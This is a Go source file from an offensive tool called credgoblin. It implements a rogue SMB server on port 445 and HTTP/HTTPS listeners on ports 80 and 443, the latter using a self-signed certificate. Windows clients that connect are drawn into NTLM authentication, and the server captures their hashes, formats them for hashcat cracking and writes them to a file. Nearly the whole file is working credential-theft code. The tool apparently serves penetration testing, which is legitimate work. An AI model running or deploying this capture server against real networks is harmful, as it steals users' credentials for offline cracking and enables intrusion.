package smb

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"math/big"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// Server represents an SMB2 server
type Server struct {
	listener       net.Listener
	httpListener   net.Listener
	httpsListener  net.Listener
	tlsConfig      *tls.Config
	config         *Config
	logger         *output.Logger
	hashWriter     *output.HashWriter
	challengeGen   *ntlm.Challenge
	authParser     *ntlm.AuthMessageParser
	hashFormatter  *ntlm.HashcatFormatter
	onHashCaptured func(string)
	wg             sync.WaitGroup
	ctx            context.Context
	cancel         context.CancelFunc
}

// Config holds SMB server configuration
type Config struct {
	ListenAddr  string
	ListenPorts string // "80", "443", "445", "both", or combinations like "80,443"
	ServerName  string
	DomainName  string
	Verbose     bool
}

// NewServer creates a new SMB server
func NewServer(config *Config, logger *output.Logger, hashWriter *output.HashWriter) *Server {
	return &Server{
		config:        config,
		logger:        logger,
		hashWriter:    hashWriter,
		challengeGen:  ntlm.NewChallenge(config.ServerName, config.DomainName),
		authParser:    ntlm.NewAuthParser(),
		hashFormatter: ntlm.NewHashcatFormatter(),
	}
}

// generateSelfSignedCert generates a self-signed TLS certificate
func (s *Server) generateSelfSignedCert() (*tls.Config, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate private key: %w", err)
	}

	notBefore := time.Now()
	notAfter := notBefore.Add(365 * 24 * time.Hour)

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, fmt.Errorf("failed to generate serial number: %w", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization: []string{"CredGoblin"},
			CommonName:   s.config.ServerName,
		},
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	cert := tls.Certificate{
		Certificate: [][]byte{derBytes},
		PrivateKey:  priv,
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS10,
	}, nil
}

// Start starts the SMB server
func (s *Server) Start(ctx context.Context) error {
	s.ctx, s.cancel = context.WithCancel(ctx)

	addr := s.config.ListenAddr
	if addr == "" {
		addr = "0.0.0.0"
	}

	// Normalize ports config
	ports := s.config.ListenPorts
	if ports == "" {
		ports = "both"
	}

	// Parse port options (can be "80", "443", "445", "both", "80,443", etc.)
	listen80 := ports == "80" || ports == "both" || strings.Contains(ports, "80")
	listen443 := ports == "443" || strings.Contains(ports, "443")
	listen445 := ports == "445" || ports == "both" || (!listen80 && !listen443)

	// Listen on port 445 for SMB (if requested)
	if listen445 {
		smbAddr := addr
		if !strings.Contains(smbAddr, ":") {
			smbAddr = fmt.Sprintf("%s:445", addr)
		}

		listener, err := net.Listen("tcp", smbAddr)
		if err != nil {
			return fmt.Errorf("failed to listen on %s: %w", smbAddr, err)
		}

		s.listener = listener
		s.logger.Info(fmt.Sprintf("SMB server listening on %s", smbAddr))
		go s.acceptLoop()
	}

	// Listen on port 80 for HTTP (if requested)
	if listen80 {
		httpAddr := fmt.Sprintf("%s:80", addr)

		httpListener, err := net.Listen("tcp", httpAddr)
		if err != nil {
			if s.listener != nil {
				s.listener.Close()
			}
			return fmt.Errorf("failed to listen on %s: %w", httpAddr, err)
		}

		s.httpListener = httpListener
		s.logger.Info(fmt.Sprintf("HTTP capture listener on %s", httpAddr))
		go s.acceptHTTPLoop()
	}

	// Listen on port 443 for HTTPS with TLS (required for Windows WebClient to authenticate)
	if listen443 {
		// Generate self-signed certificate
		tlsConfig, err := s.generateSelfSignedCert()
		if err != nil {
			if s.listener != nil {
				s.listener.Close()
			}
			if s.httpListener != nil {
				s.httpListener.Close()
			}
			return fmt.Errorf("failed to generate TLS certificate: %w", err)
		}
		s.tlsConfig = tlsConfig

		httpsAddr := fmt.Sprintf("%s:443", addr)
		httpsListener, err := tls.Listen("tcp", httpsAddr, tlsConfig)
		if err != nil {
			if s.listener != nil {
				s.listener.Close()
			}
			if s.httpListener != nil {
				s.httpListener.Close()
			}
			return fmt.Errorf("failed to listen on %s: %w", httpsAddr, err)
		}

		s.httpsListener = httpsListener
		s.logger.Info(fmt.Sprintf("HTTPS capture listener on %s", httpsAddr))
		go s.acceptHTTPSLoop()
	}

	return nil
}

// Stop stops the SMB server
func (s *Server) Stop() error {
	if s.cancel != nil {
		s.cancel()
	}

	if s.listener != nil {
		s.listener.Close()
	}

	if s.httpListener != nil {
		s.httpListener.Close()
	}

	if s.httpsListener != nil {
		s.httpsListener.Close()
	}

	s.wg.Wait()
	return nil
}

// OnHashCaptured sets a callback for when a hash is captured
func (s *Server) OnHashCaptured(callback func(string)) {
	s.onHashCaptured = callback
}

// acceptLoop accepts incoming connections
func (s *Server) acceptLoop() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			select {
			case <-s.ctx.Done():
				return
			default:
				s.logger.Error(fmt.Sprintf("SMB accept error: %v", err))
				continue
			}
		}

		s.wg.Add(1)
		go s.handleConnection(conn)
	}
}

// acceptHTTPLoop accepts incoming HTTP connections
func (s *Server) acceptHTTPLoop() {
	for {
		conn, err := s.httpListener.Accept()
		if err != nil {
			select {
			case <-s.ctx.Done():
				return
			default:
				s.logger.Error(fmt.Sprintf("HTTP accept error: %v", err))
				continue
			}
		}

		s.wg.Add(1)
		go s.handleHTTPConnection(conn)
	}
}

// acceptHTTPSLoop accepts incoming HTTPS connections with TLS
func (s *Server) acceptHTTPSLoop() {
	for {
		conn, err := s.httpsListener.Accept()
		if err != nil {
			select {
			case <-s.ctx.Done():
				return
			default:
				s.logger.Error(fmt.Sprintf("HTTPS accept error: %v", err))
				continue
			}
		}

		s.wg.Add(1)
		go s.handleHTTPSConnection(conn)
	}
}

// handleConnection handles a single SMB connection
func (s *Server) handleConnection(conn net.Conn) {
	defer s.wg.Done()
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Debug(fmt.Sprintf("New connection from %s (SMB:445)", remoteAddr))

	handler := NewHandler(conn, s.config, s.logger, s.challengeGen, s.authParser, s.hashFormatter)

	handler.OnHashCaptured(func(hash string) {
		if s.hashWriter != nil {
			if err := s.hashWriter.WriteHash(hash); err != nil {
				s.logger.Error(fmt.Sprintf("Failed to write hash: %v", err))
			}
		}

		if s.onHashCaptured != nil {
			s.onHashCaptured(hash)
		}

		s.logger.Success(fmt.Sprintf("Hash captured from %s (SMB:445): %s", remoteAddr, hash))
	})

	if err := handler.Handle(s.ctx); err != nil {
		s.logger.Debug(fmt.Sprintf("Connection error from %s: %v", remoteAddr, err))
	}
}

// handleHTTPConnection handles HTTP NTLM authentication for hash capture
func (s *Server) handleHTTPConnection(conn net.Conn) {
	defer s.wg.Done()
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Debug(fmt.Sprintf("New connection from %s (HTTP:80)", remoteAddr))

	handler := NewHTTPHandler(conn, s.config, s.logger, s.challengeGen, s.authParser, s.hashFormatter)

	handler.OnHashCaptured(func(hash string, requestPath string) {
		if s.hashWriter != nil {
			if err := s.hashWriter.WriteHash(hash); err != nil {
				s.logger.Error(fmt.Sprintf("Failed to write hash: %v", err))
			}
		}

		if s.onHashCaptured != nil {
			s.onHashCaptured(hash)
		}

		s.logger.Success(fmt.Sprintf("Hash captured from %s (HTTP:80) path=%s: %s", remoteAddr, requestPath, hash))
	})

	if err := handler.Handle(s.ctx); err != nil {
		s.logger.Debug(fmt.Sprintf("HTTP connection error from %s: %v", remoteAddr, err))
	}
}

// handleHTTPSConnection handles HTTPS NTLM authentication with TLS on port 443
func (s *Server) handleHTTPSConnection(conn net.Conn) {
	defer s.wg.Done()
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Debug(fmt.Sprintf("New connection from %s (HTTPS:443)", remoteAddr))

	handler := NewHTTPHandler(conn, s.config, s.logger, s.challengeGen, s.authParser, s.hashFormatter)

	handler.OnHashCaptured(func(hash string, requestPath string) {
		if s.hashWriter != nil {
			if err := s.hashWriter.WriteHash(hash); err != nil {
				s.logger.Error(fmt.Sprintf("Failed to write hash: %v", err))
			}
		}

		if s.onHashCaptured != nil {
			s.onHashCaptured(hash)
		}

		s.logger.Success(fmt.Sprintf("Hash captured from %s (HTTPS:443) path=%s: %s", remoteAddr, requestPath, hash))
	})

	if err := handler.Handle(s.ctx); err != nil {
		s.logger.Debug(fmt.Sprintf("HTTPS connection error from %s: %v", remoteAddr, err))
	}
}
